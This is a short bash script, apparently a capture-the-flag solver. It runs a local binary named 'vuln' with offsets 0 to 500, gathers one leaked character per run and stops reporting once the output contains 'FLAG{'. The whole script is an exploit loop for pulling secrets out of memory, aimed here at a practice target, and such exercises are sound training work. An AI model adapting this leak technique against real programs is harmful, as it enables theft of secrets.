#!/usr/bin/env bash


MAX_OFFSET=500
SECRET=""

for i in $(seq 0 $MAX_OFFSET); do
OUTPUT=$(./../vuln "$i")


CHAR=$(echo "$OUTPUT" | awk -F"'" '{print $2}')

SECRET+=$CHAR

if [[ $SECRET == *"FLAG{"* ]]; then
echo "[DEBUG] offset=$i -> $CHAR => $SECRET"
fi
done

echo "SECRET POTENTIEL : $SECRET"

